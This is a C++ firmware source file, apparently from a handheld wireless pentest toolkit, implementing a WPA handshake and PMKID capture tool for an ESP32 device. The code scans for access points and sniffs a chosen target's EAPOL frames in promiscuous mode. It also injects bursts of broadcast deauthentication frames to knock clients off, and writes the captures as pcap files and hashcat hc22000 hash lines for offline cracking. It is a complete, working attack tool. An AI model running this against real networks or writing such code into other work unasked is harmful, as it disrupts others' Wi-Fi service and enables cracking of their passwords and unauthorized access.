// ═══════════════════════════════════════════════════════════════════════════
// HaleHound EAPOL Sniffer — implementation
// Created: 2026-09-18 (T-Embed CC1101 port, roadmap §7 phase 6)
// ═══════════════════════════════════════════════════════════════════════════

#include "eapol_sniff.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include "cyd_config.h"
#include "messaging.h"
#include "radio_manager.h"
#include "storage_manager.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#define EAPOL_MAX_APS         32
#define EAPOL_MAX_FRAME_LEN   400
#define EAPOL_DEAUTH_BURST    30    // deauth frames per burst — matches eapol_capture.cpp
#define EAPOL_DEAUTH_DELAY_MS 10
#define EAPOL_DEAUTH_INTERVAL 3000  // ms between bursts while deauth is toggled on
#define EAPOL_DIR             "/eapol"
// 52 chars ≈ 312px at text size 1 on this 320px-wide panel — the original's
// row shows SSID + CH + RSSI + ENC on one 320px line, so 40 truncated SSIDs.
#define EAPOL_RESULT_LINE_LEN 52

// ── AP list (SCAN phase) ────────────────────────────────────────────────
struct APInfo {
    uint8_t bssid[6];
    char ssid[33];
    int rssi;
    uint8_t channel;
    uint8_t authMode;
};
static APInfo s_apList[EAPOL_MAX_APS];
static int s_apCount = 0;
static int s_selectedAP = -1;

static char s_apLineBuf[EAPOL_MAX_APS][EAPOL_RESULT_LINE_LEN];
static const char *s_apLinePtrs[EAPOL_MAX_APS];

static TaskHandle_t s_workerHandle = NULL;
static QueueHandle_t s_cmdQueue = NULL;
static SemaphoreHandle_t s_doneSem = NULL;

// ── Capture state (CAPTURE phase) — mirrors eapol_capture.cpp's globals ──
static volatile uint32_t s_packetCount = 0;
static volatile uint32_t s_eapolCount = 0;
static volatile bool s_hasMsg1 = false, s_hasMsg2 = false, s_hasMsg3 = false, s_hasMsg4 = false;
static volatile bool s_hasPMKID = false, s_hasHandshake = false;
static volatile bool s_deauthRunning = false;

static uint8_t s_msg1Frame[EAPOL_MAX_FRAME_LEN];
static uint16_t s_msg1Len = 0;
static uint8_t s_msg2Frame[EAPOL_MAX_FRAME_LEN];
static uint16_t s_msg2Len = 0;
static uint8_t s_beaconFrame[512];
static uint16_t s_beaconLen = 0;

static uint8_t s_pmkidBytes[16];
static uint8_t s_anonceBytes[32];
static uint8_t s_micBytes[16];
static uint8_t s_staMAC[6];
static bool s_savedPMKID = false;
static bool s_savedHandshake = false;

// ═══════════════════════════════════════════════════════════════════════════
// HEX HELPERS — ported from eapol_capture.cpp verbatim
// ═══════════════════════════════════════════════════════════════════════════

static void bytesToHex(const uint8_t *bytes, int len, char *out) {
    for (int i = 0; i < len; i++) {
        sprintf(out + (i * 2), "%02x", bytes[i]);
    }
    out[len * 2] = '\0';
}

static void macToHexStr(const uint8_t *mac, char *out) {
    bytesToHex(mac, 6, out);
}

static void ssidToHex(const char *ssid, char *out) {
    bytesToHex((const uint8_t *)ssid, strlen(ssid), out);
}

// ═══════════════════════════════════════════════════════════════════════════
// EAPOL FRAME PARSING — ported from eapol_capture.cpp verbatim
// ═══════════════════════════════════════════════════════════════════════════

static bool isEAPOL(const uint8_t *payload, int len) {
    if (len < 36) return false;

    if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 &&
        payload[27] == 0x00 && payload[28] == 0x00 && payload[29] == 0x00 &&
        payload[30] == 0x88 && payload[31] == 0x8E) {
        return true;
    }

    if ((payload[0] & 0xF0) == 0x80) {
        if (len < 38) return false;
        if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 &&
            payload[29] == 0x00 && payload[30] == 0x00 && payload[31] == 0x00 &&
            payload[32] == 0x88 && payload[33] == 0x8E) {
            return true;
        }
    }
    return false;
}

static int getEapolOffset(const uint8_t *payload) {
    if ((payload[0] & 0xF0) == 0x80) return 34; // QoS data
    return 32;                                  // Standard data
}

static int classifyMessage(const uint8_t *payload, int len) {
    int eapolOff = getEapolOffset(payload);
    int keyInfoOff = eapolOff + 5;
    if (len < keyInfoOff + 2) return -1;

    uint16_t keyInfo = ((uint16_t)payload[keyInfoOff] << 8) | payload[keyInfoOff + 1];
    bool install = keyInfo & (1 << 6);
    bool ack     = keyInfo & (1 << 7);
    bool mic     = keyInfo & (1 << 8);
    bool secure  = keyInfo & (1 << 9);

    if ( ack && !mic && !install)            return 1;
    if (!ack &&  mic && !install && !secure) return 2;
    if ( ack &&  mic &&  install)            return 3;
    if (!ack &&  mic && !install &&  secure) return 4;
    return -1;
}

static void extractANonce(const uint8_t *payload) {
    int eapolOff = getEapolOffset(payload);
    memcpy(s_anonceBytes, payload + eapolOff + 4 + 13, 32);
}

static void extractMIC(const uint8_t *payload) {
    int eapolOff = getEapolOffset(payload);
    memcpy(s_micBytes, payload + eapolOff + 4 + 77, 16);
}

static void extractSTAMac(const uint8_t *payload) {
    memcpy(s_staMAC, payload + 10, 6);
}

static bool extractPMKID(const uint8_t *payload, int len) {
    int eapolOff = getEapolOffset(payload);
    int kdLenOff = eapolOff + 4 + 93;
    if (len < kdLenOff + 2) return false;

    uint16_t keyDataLen = ((uint16_t)payload[kdLenOff] << 8) | payload[kdLenOff + 1];
    int kdStart = eapolOff + 4 + 95;
    if (len < kdStart + (int)keyDataLen) return false;
    if (keyDataLen < 22) return false;

    const uint8_t *kd = payload + kdStart;
    int pos = 0;
    while (pos + 2 <= (int)keyDataLen) {
        uint8_t tag = kd[pos];
        uint8_t tagLen = kd[pos + 1];
        if (pos + 2 + tagLen > (int)keyDataLen) break;

        if (tag == 0xDD && tagLen >= 20) {
            if (kd[pos + 2] == 0x00 && kd[pos + 3] == 0x0F &&
                kd[pos + 4] == 0xAC && kd[pos + 5] == 0x04) {
                memcpy(s_pmkidBytes, kd + pos + 6, 16);
                return true;
            }
        }
        pos += 2 + tagLen;
    }
    return false;
}

// ═══════════════════════════════════════════════════════════════════════════
// PROMISCUOUS CALLBACK — targeted at s_selectedAP, mirrors
// eapol_capture.cpp's promiscuousCallback(). Only plain SRAM-to-SRAM
// copies happen here (no PSRAM/queue calls — psram_pool.h is explicit
// that ISR/callback contexts must never risk a cache-miss stall there),
// matching what the original already did.
// ═══════════════════════════════════════════════════════════════════════════

static void IRAM_ATTR promiscRxCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24 || s_selectedAP < 0) return;

    s_packetCount++;

    uint16_t frameCtrl = (uint16_t)payload[0] | ((uint16_t)payload[1] << 8);
    uint8_t frameType = (frameCtrl & 0x0C) >> 2;
    uint8_t frameSubType = (frameCtrl & 0xF0) >> 4;

    if (frameType == 0x00 && frameSubType == 0x08 && s_beaconLen == 0) {
        if (memcmp(payload + 16, s_apList[s_selectedAP].bssid, 6) == 0) {
            int copyLen = (len > (int)sizeof(s_beaconFrame)) ? (int)sizeof(s_beaconFrame) : len;
            memcpy(s_beaconFrame, payload, copyLen);
            s_beaconLen = copyLen;
        }
    }

    if (!isEAPOL(payload, len)) return;

    bool matchesTarget = (memcmp(payload + 4, s_apList[s_selectedAP].bssid, 6) == 0) ||
                          (memcmp(payload + 10, s_apList[s_selectedAP].bssid, 6) == 0) ||
                          (memcmp(payload + 16, s_apList[s_selectedAP].bssid, 6) == 0);
    if (!matchesTarget) return;

    s_eapolCount++;
    int msgNum = classifyMessage(payload, len);
    int copyLen = (len > EAPOL_MAX_FRAME_LEN) ? EAPOL_MAX_FRAME_LEN : len;

    switch (msgNum) {
        case 1:
            s_hasMsg1 = true;
            memcpy(s_msg1Frame, payload, copyLen);
            s_msg1Len = copyLen;
            extractANonce(payload);
            if (extractPMKID(payload, len)) {
                memcpy(s_staMAC, payload + 4, 6);
                s_hasPMKID = true;
            }
            break;
        case 2:
            s_hasMsg2 = true;
            memcpy(s_msg2Frame, payload, copyLen);
            s_msg2Len = copyLen;
            extractMIC(payload);
            extractSTAMac(payload);
            if (s_hasMsg1) s_hasHandshake = true;
            break;
        case 3:
            s_hasMsg3 = true;
            break;
        case 4:
            s_hasMsg4 = true;
            break;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// DEAUTH INJECTION — ported from eapol_capture.cpp's sendDeauth()
// ═══════════════════════════════════════════════════════════════════════════

static void sendDeauth() {
    if (s_selectedAP < 0) return;

    uint8_t deauthFrame[26] = {
        0xC0, 0x00,                         // Frame Control (Deauth)
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence
        0x07, 0x00                          // Reason: class 3 from non-assoc STA
    };
    memcpy(deauthFrame + 10, s_apList[s_selectedAP].bssid, 6);
    memcpy(deauthFrame + 16, s_apList[s_selectedAP].bssid, 6);

    esp_wifi_set_channel(s_apList[s_selectedAP].channel, WIFI_SECOND_CHAN_NONE);
    int ok = 0, fail = 0;
    for (int i = 0; i < EAPOL_DEAUTH_BURST; i++) {
        if (esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false) == ESP_OK) {
            ok++;
        } else {
            fail++;
        }
        delayMicroseconds(EAPOL_DEAUTH_DELAY_MS * 1000);
    }
    #if CYD_DEBUG
    Serial.printf("[EAPOL-DEAUTH] ch%d: %d OK, %d FAIL\n",
                  s_apList[s_selectedAP].channel, ok, fail);
    #endif
}

// ═══════════════════════════════════════════════════════════════════════════
// WIFI INIT / CLEANUP — raw ESP-IDF APSTA mode, ported from
// eapol_capture.cpp's initPromiscuous()/wifiFullDeinit(). APSTA (not
// STA-only promiscuous) is required for esp_wifi_80211_tx() deauth
// injection to actually go out — Arduino WiFi.mode(WIFI_AP) reports OK
// but frames don't leave the radio, per that file's own comment.
// ═══════════════════════════════════════════════════════════════════════════

static void initPromiscuous() {
    WiFi.mode(WIFI_OFF);
    delay(50);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_start();
    delay(50);

    wifi_config_t apConfig;
    memset(&apConfig, 0, sizeof(apConfig));
    apConfig.ap.ssid_len = 0;
    apConfig.ap.channel = s_apList[s_selectedAP].channel;
    apConfig.ap.authmode = WIFI_AUTH_OPEN;
    apConfig.ap.ssid_hidden = 1;
    apConfig.ap.max_connection = 0;
    apConfig.ap.beacon_interval = 60000;
    esp_wifi_set_config(WIFI_IF_AP, &apConfig);

    esp_wifi_set_max_tx_power(82);
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_channel(s_apList[s_selectedAP].channel, WIFI_SECOND_CHAN_NONE);

    wifi_promiscuous_filter_t filt;
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&promiscRxCb);
    esp_wifi_set_promiscuous(true);
}

// Arduino API only for final teardown — matches the original's comment:
// calling esp_wifi_init()/deinit() directly desyncs Arduino's internal
// _esp_wifi_started flag and silently breaks WiFi for other modules after.
static void wifiFullDeinit() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(50);
}

// ═══════════════════════════════════════════════════════════════════════════
// SAVE CAPTURES — ported from eapol_capture.cpp's saveCaptures()/
// pcapOpen()/pcapWritePacket()/writeHC22000_PMKID()/writeHC22000_Handshake(),
// routed through storage_manager instead of calling SD.* directly.
// ═══════════════════════════════════════════════════════════════════════════

#define EAPOL_PCAP_RECORD_MAX (16 + 512) // 16-byte record header + largest frame we store (beacon)

static void writePcapRecord(const uint8_t *data, uint16_t len) {
    if (len > EAPOL_PCAP_RECORD_MAX - 16) {
        len = EAPOL_PCAP_RECORD_MAX - 16;
    }
    uint8_t record[EAPOL_PCAP_RECORD_MAX];
    uint32_t tsSec = millis() / 1000;
    uint32_t tsUsec = (millis() % 1000) * 1000;
    uint32_t inclLen = len, origLen = len;
    memcpy(record + 0, &tsSec, 4);
    memcpy(record + 4, &tsUsec, 4);
    memcpy(record + 8, &inclLen, 4);
    memcpy(record + 12, &origLen, 4);
    memcpy(record + 16, data, len);
    storageCaptureBytes(record, 16 + len);
}

static void saveCaptures() {
    if (!storageIsCardPresent() || s_selectedAP < 0) return;

    storageEnsureDir(EAPOL_DIR);

    char safeSSID[33];
    strncpy(safeSSID, s_apList[s_selectedAP].ssid, 32);
    safeSSID[32] = '\0';
    for (int i = 0; safeSSID[i]; i++) {
        if (safeSSID[i] == ' ' || safeSSID[i] == '/' || safeSSID[i] == '\\') safeSSID[i] = '_';
    }

    char pcapPath[80], hcPath[80];
    snprintf(pcapPath, sizeof(pcapPath), "%s/%s.pcap", EAPOL_DIR, safeSSID);
    snprintf(hcPath, sizeof(hcPath), "%s/%s.hc22000", EAPOL_DIR, safeSSID);

    if (storageResetCaptureFile(pcapPath)) {
        uint8_t globalHeader[24];
        uint32_t magic = 0xa1b2c3d4;
        uint16_t verMaj = 2, verMin = 4;
        uint32_t thiszone = 0, sigfigs = 0, snaplen = 2500, network = 105; // LINKTYPE_IEEE802_11
        memcpy(globalHeader + 0, &magic, 4);
        memcpy(globalHeader + 4, &verMaj, 2);
        memcpy(globalHeader + 6, &verMin, 2);
        memcpy(globalHeader + 8, &thiszone, 4);
        memcpy(globalHeader + 12, &sigfigs, 4);
        memcpy(globalHeader + 16, &snaplen, 4);
        memcpy(globalHeader + 20, &network, 4);
        storageCaptureBytes(globalHeader, sizeof(globalHeader));

        if (s_beaconLen > 0) writePcapRecord(s_beaconFrame, s_beaconLen);
        if (s_msg1Len > 0) writePcapRecord(s_msg1Frame, s_msg1Len);
        if (s_msg2Len > 0) writePcapRecord(s_msg2Frame, s_msg2Len);
    }

    if (s_hasPMKID && !s_savedPMKID) {
        char pmkidHex[33], apMacHex[13], staMacHex[13], ssidHex[65], line[256];
        bytesToHex(s_pmkidBytes, 16, pmkidHex);
        macToHexStr(s_apList[s_selectedAP].bssid, apMacHex);
        macToHexStr(s_staMAC, staMacHex);
        ssidToHex(s_apList[s_selectedAP].ssid, ssidHex);
        snprintf(line, sizeof(line), "WPA*01*%s*%s*%s*%s***\n", pmkidHex, apMacHex, staMacHex, ssidHex);
        if (storageAppendTextFile(hcPath, line)) {
            s_savedPMKID = true;
        }
    }

    if (s_hasHandshake && !s_savedHandshake) {
        int eapolOff = getEapolOffset(s_msg2Frame);
        int eapolFrameLen = s_msg2Len - eapolOff;
        if (eapolFrameLen > 0 && eapolFrameLen <= EAPOL_MAX_FRAME_LEN) {
            uint8_t eapolCopy[EAPOL_MAX_FRAME_LEN];
            memcpy(eapolCopy, s_msg2Frame + eapolOff, eapolFrameLen);
            if (eapolFrameLen >= 97) {
                memset(eapolCopy + 81, 0, 16); // zero MIC field
            }

            char eapolHex[EAPOL_MAX_FRAME_LEN * 2 + 1];
            bytesToHex(eapolCopy, eapolFrameLen, eapolHex);

            char micHex[33], apMacHex[13], staMacHex[13], ssidHex[65], anonceHex[65];
            bytesToHex(s_micBytes, 16, micHex);
            macToHexStr(s_apList[s_selectedAP].bssid, apMacHex);
            macToHexStr(s_staMAC, staMacHex);
            ssidToHex(s_apList[s_selectedAP].ssid, ssidHex);
            bytesToHex(s_anonceBytes, 32, anonceHex);

            char line[EAPOL_MAX_FRAME_LEN * 2 + 256];
            snprintf(line, sizeof(line), "WPA*02*%s*%s*%s*%s*%s*%s*00\n",
                     micHex, apMacHex, staMacHex, ssidHex, anonceHex, eapolHex);
            if (storageAppendTextFile(hcPath, line)) {
                s_savedHandshake = true;
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SCAN PHASE — same async scan+poll shape as wifi_scan.cpp, but keeps
// full AP structs (bssid/channel/authMode) instead of just display text,
// since the CAPTURE phase needs them.
// ═══════════════════════════════════════════════════════════════════════════

static void formatApResults() {
    for (int i = 0; i < s_apCount; i++) {
        bool hasEAPOL = s_apList[i].authMode >= WIFI_AUTH_WPA_PSK;
        const char *ssid = (s_apList[i].ssid[0] != '\0') ? s_apList[i].ssid : "[Hidden]";
        snprintf(s_apLineBuf[i], EAPOL_RESULT_LINE_LEN, "%s%s CH%d %ddBm",
                 hasEAPOL ? "" : "(no EAPOL) ", ssid, s_apList[i].channel, s_apList[i].rssi);
        s_apLinePtrs[i] = s_apLineBuf[i];
    }
    if (s_apCount == 0) {
        snprintf(s_apLineBuf[0], EAPOL_RESULT_LINE_LEN, "(no APs found)");
        s_apLinePtrs[0] = s_apLineBuf[0];
        s_apCount = 1; // so the list renderer has one (dead) row instead of an empty list
    }
}

static void scanWorkerTask(void *param) {
    (void)param;

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    WiFi.scanNetworks(true /* async */, true /* show hidden */);

    for (;;) {
        int n = WiFi.scanComplete();
        if (n >= 0) {
            s_apCount = 0;
            for (int i = 0; i < n && s_apCount < EAPOL_MAX_APS; i++) {
                memcpy(s_apList[s_apCount].bssid, WiFi.BSSID(i), 6);
                strncpy(s_apList[s_apCount].ssid, WiFi.SSID(i).c_str(), 32);
                s_apList[s_apCount].ssid[32] = '\0';
                s_apList[s_apCount].rssi = WiFi.RSSI(i);
                s_apList[s_apCount].channel = WiFi.channel(i);
                s_apList[s_apCount].authMode = (uint8_t)WiFi.encryptionType(i);
                s_apCount++;
            }
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            formatApResults();

            RenderMsg msg;
            msg.kind = RENDER_MSG_SCAN_COMPLETE;
            messagingPostTelemetry(msg);
            break;
        }

        Cmd cmd;
        if (xQueueReceive(s_cmdQueue, &cmd, pdMS_TO_TICKS(100)) == pdTRUE && cmd.type == CMD_STOP) {
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            goto cleanup;
        }
    }

    // Results are up; wait here until told to stop (mirrors wifi_scan.cpp).
    for (;;) {
        Cmd cmd;
        if (xQueueReceive(s_cmdQueue, &cmd, portMAX_DELAY) == pdTRUE && cmd.type == CMD_STOP) {
            break;
        }
    }

cleanup:
    radioRelease(RADIO_WIFI);
    xSemaphoreGive(s_doneSem);
    vTaskDelete(NULL);
}

void eapolSniffScanStart() {
    if (!radioAcquire(RADIO_WIFI)) {
        #if CYD_DEBUG
        Serial.println("[EAPOL_SNIFF] ERROR: could not acquire radio for scan");
        #endif
        return;
    }

    s_apCount = 0;
    s_selectedAP = -1;
    s_cmdQueue = messagingCreateCmdQueue();
    s_doneSem = xSemaphoreCreateBinary();

    xTaskCreatePinnedToCore(scanWorkerTask, "eapol_scan", 6144, NULL, 2, &s_workerHandle, 0);
}

void eapolSniffScanStop() {
    if (!s_cmdQueue) return;

    Cmd cmd;
    cmd.type = CMD_STOP;
    xQueueSend(s_cmdQueue, &cmd, portMAX_DELAY);
    xSemaphoreTake(s_doneSem, portMAX_DELAY);

    vQueueDelete(s_cmdQueue);
    vSemaphoreDelete(s_doneSem);
    s_cmdQueue = NULL;
    s_doneSem = NULL;
    s_workerHandle = NULL;
}

const char *const *eapolSniffGetApResultLines() {
    return s_apLinePtrs;
}

int eapolSniffGetApResultCount() {
    return s_apCount;
}

// ═══════════════════════════════════════════════════════════════════════════
// CAPTURE PHASE
// ═══════════════════════════════════════════════════════════════════════════

static void captureWorkerTask(void *param) {
    (void)param;

    s_packetCount = 0;
    s_eapolCount = 0;
    s_hasMsg1 = s_hasMsg2 = s_hasMsg3 = s_hasMsg4 = false;
    s_hasPMKID = s_hasHandshake = false;
    s_savedPMKID = s_savedHandshake = false;
    s_msg1Len = s_msg2Len = s_beaconLen = 0;
    s_deauthRunning = false;
    // Same zeroing the original does in setup() — keeps stale crypto
    // material from a previous target out of any early save.
    memset(s_pmkidBytes, 0, sizeof(s_pmkidBytes));
    memset(s_anonceBytes, 0, sizeof(s_anonceBytes));
    memset(s_micBytes, 0, sizeof(s_micBytes));
    memset(s_staMAC, 0, sizeof(s_staMAC));

    initPromiscuous();

    unsigned long lastDeauthSend = 0;
    bool everSaved = false;

    for (;;) {
        Cmd cmd;
        if (xQueueReceive(s_cmdQueue, &cmd, pdMS_TO_TICKS(200)) == pdTRUE) {
            if (cmd.type == CMD_STOP) {
                break;
            }
            if (cmd.type == CMD_PAUSE) { // reused as the "toggle deauth" signal
                s_deauthRunning = !s_deauthRunning;
                if (s_deauthRunning) lastDeauthSend = 0; // send immediately
            }
        }

        if (s_deauthRunning && (millis() - lastDeauthSend >= EAPOL_DEAUTH_INTERVAL)) {
            sendDeauth();
            lastDeauthSend = millis();
        }

        // Auto-save the moment a PMKID or full handshake completes —
        // matches the original's "auto-save fired for this capture" logic.
        if ((s_hasPMKID && !s_savedPMKID) || (s_hasHandshake && !s_savedHandshake)) {
            saveCaptures();
            everSaved = true;
        }

        RenderMsg msg;
        msg.kind = RENDER_MSG_STATUS_TEXT;
        // Same information the original's capture screen shows: packet
        // count, EAPOL count, M1-M4 indicators, PMKID/handshake state,
        // deauth state.
        snprintf(msg.payload.text, RENDER_MSG_TEXT_MAX, "P:%lu E:%lu M:%c%c%c%c PMK:%c HS:%c%s",
                 (unsigned long)s_packetCount, (unsigned long)s_eapolCount,
                 s_hasMsg1 ? '1' : '-', s_hasMsg2 ? '2' : '-',
                 s_hasMsg3 ? '3' : '-', s_hasMsg4 ? '4' : '-',
                 s_hasPMKID ? 'Y' : 'n', s_hasHandshake ? 'Y' : 'n',
                 s_deauthRunning ? " D" : "");
        messagingPostTelemetry(msg);
    }

    // Backstop save on exit, same as the original's BACK handler.
    if ((s_hasPMKID || s_hasHandshake) && !everSaved) {
        saveCaptures();
    }

    wifiFullDeinit();
    radioRelease(RADIO_WIFI);
    xSemaphoreGive(s_doneSem);
    vTaskDelete(NULL);
}

void eapolSniffSelectTarget(int index) {
    if (index < 0 || index >= s_apCount) return;
    s_selectedAP = index;

    if (!radioAcquire(RADIO_WIFI)) {
        #if CYD_DEBUG
        Serial.println("[EAPOL_SNIFF] ERROR: could not acquire radio for capture");
        #endif
        return;
    }

    s_cmdQueue = messagingCreateCmdQueue();
    s_doneSem = xSemaphoreCreateBinary();

    xTaskCreatePinnedToCore(captureWorkerTask, "eapol_capture", 6144, NULL, 2, &s_workerHandle, 0);
}

void eapolSniffToggleDeauth() {
    if (!s_cmdQueue) return;
    Cmd cmd;
    cmd.type = CMD_PAUSE; // reused here as "toggle deauth" — see captureWorkerTask
    xQueueSend(s_cmdQueue, &cmd, 0);
}

void eapolSniffCaptureStop() {
    if (!s_cmdQueue) return;

    Cmd cmd;
    cmd.type = CMD_STOP;
    xQueueSend(s_cmdQueue, &cmd, portMAX_DELAY);
    xSemaphoreTake(s_doneSem, portMAX_DELAY);

    vQueueDelete(s_cmdQueue);
    vSemaphoreDelete(s_doneSem);
    s_cmdQueue = NULL;
    s_doneSem = NULL;
    s_workerHandle = NULL;
}

bool eapolSniffApHasEapol(int index) {
    // Mirrors eapol_capture.cpp's checkAPListTouch(): only WPA2+ rows are
    // selectable, since open/WEP APs can never produce an EAPOL exchange.
    return index >= 0 && index < s_apCount &&
           s_apList[index].authMode >= WIFI_AUTH_WPA_PSK;
}

void eapolSniffSaveNow() {
    if (s_selectedAP < 0) return;

    // Encoder equivalent of the original's SAVE button: re-arm the saved
    // flags first so this save always writes (appending another .hc22000
    // line), then let saveCaptures() re-set them on success.
    s_savedPMKID = false;
    s_savedHandshake = false;
    if (s_hasPMKID || s_hasHandshake) {
        saveCaptures();
    }
}
